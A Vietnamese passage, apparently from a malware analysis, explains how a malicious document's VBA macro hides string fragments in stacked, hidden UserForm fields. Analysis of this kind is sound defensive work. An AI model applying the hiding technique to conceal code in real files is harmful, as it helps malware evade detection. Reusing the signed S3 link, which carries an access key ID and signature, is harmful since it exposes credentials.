+Tuy nhiên, ta nhớ rằng cũng có các `trường ẩn được liên kết với đối tượng biểu mẫu` mà ta đã xác định trước đó. Chúng ta có thể mở mục biểu mẫu người dùng được liên kết với "`Bkc5re_xxwma`" và ở cuối danh sách. Chúng ta có thể thấy bên dưới rằng biểu mẫu người dùng trông trống rỗng. Tuy nhiên, khi chúng ta di chuyển box, chúng ta có thể thấy rằng có một số trường được sắp xếp chồng lên nhau. Sau khi bóc tách các lớp trường, bây giờ chúng ta có thể thấy rằng một số tên trường này đã được tham chiếu làm biến trong mã VBA, sau đó tải các giá trị văn bản của chúng, ví dụ: `"P", "tu" và "tar"`.
+
+![Screen-Shot-2021-08-19-at-10.39.20-AM-1024x817](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_05d0e680a2782a45d3c0fdc8593cffa5.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743070210&Signature=nMUIyfLz0jEFcu71aKG%2FVlKKciY%3D)
